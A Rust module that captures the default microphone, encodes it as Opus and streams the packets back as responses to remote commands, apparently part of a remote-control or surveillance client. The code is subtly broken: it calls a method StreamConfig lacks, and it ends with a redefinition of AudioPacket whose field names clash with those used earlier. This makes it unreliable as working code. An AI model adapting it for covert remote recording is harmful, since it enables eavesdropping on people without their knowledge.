use cpal::{
    Device, Host, SampleFormat, SampleRate, StreamConfig,
    traits::{DeviceTrait, HostTrait, StreamTrait},
};
use opus::{Application, Channels, Encoder};
use shared::commands::{AudioPacket, BaseResponse, CapturePacket, CaptureType, Response};
use smol::channel::Sender;
use std::{
    collections::VecDeque,
    sync::{
        Arc, Mutex,
        atomic::{AtomicBool, Ordering},
    },
    thread,
    time::Duration,
};

use crate::handler::send;

const SAMPLE_RATE: u32 = 48000; // Opus standard sample rate
const CHANNELS: u16 = 2; // Stereo
const FRAME_SIZE: usize = 960; // 20ms at 48kHz (48000 / 50)
const BUFFER_SIZE: usize = FRAME_SIZE * CHANNELS as usize;

pub struct AudioCapturer {
    device: Device,
    config: StreamConfig,
    encoder: Encoder,
    buffer: Arc<Mutex<VecDeque<f32>>>,
}

impl AudioCapturer {
    pub fn new() -> Result<Self, Box<dyn std::error::Error>> {
        let host = cpal::default_host();
        let device = host
            .default_input_device()
            .ok_or("No input device available")?;

        println!("Using audio input device: \"{}\"", device.name()?);

        // Set up the input stream configuration
        let supported_configs = device.supported_input_configs()?;
        let supported_config = supported_configs
            .filter(|config| {
                config.channels() == CHANNELS
                    && config.min_sample_rate() <= SampleRate(SAMPLE_RATE)
                    && config.max_sample_rate() >= SampleRate(SAMPLE_RATE)
            })
            .next()
            .ok_or("No supported audio configuration found")?;

        let config = StreamConfig {
            channels: CHANNELS,
            sample_rate: SampleRate(SAMPLE_RATE),
            buffer_size: cpal::BufferSize::Default,
        };

        // Create Opus encoder
        let encoder = Encoder::new(SAMPLE_RATE, Channels::Stereo, Application::Audio)?;

        let buffer = Arc::new(Mutex::new(VecDeque::with_capacity(BUFFER_SIZE * 10)));

        Ok(AudioCapturer {
            device,
            config,
            encoder,
            buffer,
        })
    }

    fn convert_samples<T>(&self, input: &[T]) -> Vec<f32>
    where
        T: cpal::Sample,
    {
        input.iter().map(|&sample| sample.to_f32()).collect()
    }

    pub fn start_capture(
        &mut self,
        running: Arc<AtomicBool>,
    ) -> Result<cpal::Stream, Box<dyn std::error::Error>> {
        let buffer_clone = Arc::clone(&self.buffer);
        let running_clone = Arc::clone(&running);

        let stream = match self.config.sample_format() {
            SampleFormat::I8 => self.build_stream::<i8>(buffer_clone, running_clone)?,
            SampleFormat::I16 => self.build_stream::<i16>(buffer_clone, running_clone)?,
            SampleFormat::I32 => self.build_stream::<i32>(buffer_clone, running_clone)?,
            SampleFormat::F32 => self.build_stream::<f32>(buffer_clone, running_clone)?,
            sample_format => {
                return Err(format!("Unsupported sample format '{sample_format}'").into());
            }
        };

        stream.play()?;
        Ok(stream)
    }

    fn build_stream<T>(
        &self,
        buffer: Arc<Mutex<VecDeque<f32>>>,
        running: Arc<AtomicBool>,
    ) -> Result<cpal::Stream, cpal::BuildStreamError>
    where
        T: cpal::Sample + Send + 'static,
    {
        let config = self.config.clone();

        self.device.build_input_stream(
            &config,
            move |data: &[T], _: &cpal::InputCallbackInfo| {
                if !running.load(Ordering::SeqCst) {
                    return;
                }

                let samples: Vec<f32> = data.iter().map(|&sample| sample.to_f32()).collect();

                if let Ok(mut buffer_lock) = buffer.lock() {
                    for sample in samples {
                        buffer_lock.push_back(sample);
                    }
                }
            },
            move |err| {
                eprintln!("Audio stream error: {}", err);
            },
            None,
        )
    }

    pub fn get_audio_frame(&mut self) -> Option<AudioPacket> {
        let mut buffer_lock = self.buffer.lock().ok()?;

        if buffer_lock.len() < BUFFER_SIZE {
            return None; // Not enough samples yet
        }

        // Extract samples for one frame
        let mut frame_samples = Vec::with_capacity(BUFFER_SIZE);
        for _ in 0..BUFFER_SIZE {
            if let Some(sample) = buffer_lock.pop_front() {
                frame_samples.push(sample);
            }
        }

        // Convert f32 samples to i16 for Opus (Opus expects 16-bit samples)
        let pcm_data: Vec<i16> = frame_samples
            .iter()
            .map(|&sample| (sample * i16::MAX as f32) as i16)
            .collect();

        // Encode with Opus
        match self.encoder.encode(&pcm_data, Vec::with_capacity(4000)) {
            Ok(encoded_data) => {
                println!("[*] encoded audio frame: {} bytes", encoded_data.len());
                Some(AudioPacket {
                    data: encoded_data,
                    rate: SAMPLE_RATE,
                    channels: CHANNELS,
                    duration: 20, // 20ms frame
                })
            }
            Err(e) => {
                eprintln!("Opus encoding error: {}", e);
                None
            }
        }
    }
}

pub fn main(id: u64, tx: Sender<Vec<u8>>, running: Arc<AtomicBool>) {
    let mut capturer = match AudioCapturer::new() {
        Ok(capturer) => capturer,
        Err(e) => {
            eprintln!("Failed to initialize audio capturer: {}", e);
            return;
        }
    };

    // Start the audio capture stream
    let _stream = match capturer.start_capture(Arc::clone(&running)) {
        Ok(stream) => stream,
        Err(e) => {
            eprintln!("Failed to start audio capture: {}", e);
            return;
        }
    };

    println!("[*] Audio capture started");

    loop {
        if !running.load(Ordering::SeqCst) {
            println!("[a] signal to stop capturing! breaking loop");
            break;
        }

        if let Some(audio_packet) = capturer.get_audio_frame() {
            println!("[*] got audio frame");

            send(
                BaseResponse {
                    id,
                    response: Response::CapturePacket(
                        CaptureType::Audio,
                        CapturePacket::Audio(audio_packet),
                    ),
                },
                &tx,
            );
        }

        // Sleep for a shorter duration since audio frames are smaller and more frequent
        thread::sleep(Duration::from_millis(10));
    }
}

// You'll need to add this to your shared::commands module
#[derive(Clone, Debug)]
pub struct AudioPacket {
    pub data: Vec<u8>,    // Opus-encoded audio data
    pub sample_rate: u32, // Sample rate (48kHz for Opus)
    pub channels: u16,    // Number of channels
    pub duration_ms: u32, // Duration of this frame in milliseconds
}
